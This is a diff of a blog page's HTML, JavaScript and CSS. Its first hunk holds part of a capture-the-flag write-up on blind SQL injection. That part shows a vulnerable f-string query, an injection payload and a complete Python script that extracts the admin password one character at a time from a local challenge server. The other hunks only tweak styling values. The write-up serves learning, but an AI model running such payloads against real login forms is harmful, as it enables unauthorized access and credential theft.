@@ -476,11 +476,11 @@ UNION</h2>
 <h2 id="sqli-5---blind-sqli">sqli 5 - blind SQLi</h2>
 <p>vulnerable query uses f-string interpolation:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query = <span class="string">f&quot;SELECT rowid, * FROM users WHERE username = &#x27;<span class="subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="subst">&#123; password &#125;</span>&#x27;&quot;</span></span><br><span class="line">user = db.execute(query).fetchone()</span><br></pre></td></tr></table></figure>
-<p>admin’s password is the flag. no direct output – need blind
+<p>admin's password is the flag. no direct output -- need blind
 extraction.</p>
 <p>naive attempt fails because AND has higher precedence than OR:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># password=&#x27; or substr(password,1,1)=&#x27;p&#x27; --</span></span><br><span class="line"><span class="comment"># parses as: (username=&#x27;admin&#x27; AND password=&#x27;&#x27;) OR (substr(...)=&#x27;p&#x27;)</span></span><br><span class="line"><span class="comment"># this matches ANY user when substr is true, not just admin</span></span><br></pre></td></tr></table></figure>
-<p>blind extraction script – check one char at a time,
+<p>blind extraction script -- check one char at a time,
 <code>OR username='admin' AND substr(...)</code> ensures we only match
 admin:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.localhost:80/&quot;</span></span><br><span class="line">charset = string.printable.strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind_sql</span>():</span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> charset:</span><br><span class="line">            payload = <span class="string">f&quot;&#x27; OR username=&#x27;admin&#x27; AND substr(password,<span class="subst">&#123;pos&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27; --&quot;</span></span><br><span class="line">            resp = requests.post(url, data=&#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;password&quot;</span>: payload&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">            <span class="keyword">if</span> resp.status_code != <span class="number">403</span> <span class="keyword">and</span> resp.status_code != <span class="number">500</span>:</span><br><span class="line">                result += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot; [+] Current extracted: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot; [+] Extracted: <span class="subst">&#123;blind_sql()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
@@ -635,8 +635,8 @@ admin:</p>
     let observer = null;
     let rafId = null;
 
-    const parallaxFactor = 0.1; // 提升移动幅度
-    const lerpFactor = 0.3; // 提升响应灵敏度
+    const parallaxFactor = 0.05; // 提升移动幅度
+    const lerpFactor = 0.05; // 提升响应灵敏度
     let currentY = 0; // 渲染位置
     let targetY = 0; // 目标位置
     let isUpdating = false; // 正在执行内容更新锁
@@ -751,7 +751,7 @@ admin:</p>
     transform: translateX(-50%);
     font-size: 10vw;
     font-weight: 900;
-    color: rgba(255, 255, 255, 0.035);
+    color: rgba(255, 255, 255, 0.05);
     text-transform: uppercase;
     white-space: nowrap;
     pointer-events: none;
@@ -759,7 +759,7 @@ admin:</p>
     user-select: none;
     font-family: "Roboto Mono", monospace;
     letter-spacing: -2px;
-    filter: blur(5px);
+    filter: blur(1.2px);
     opacity: 0; /* 初始隐藏，由 JS 控制淡入 */
     transition: opacity 1.2s cubic-bezier(0.4, 0, 0.2, 1);
     will-change: transform, opacity;
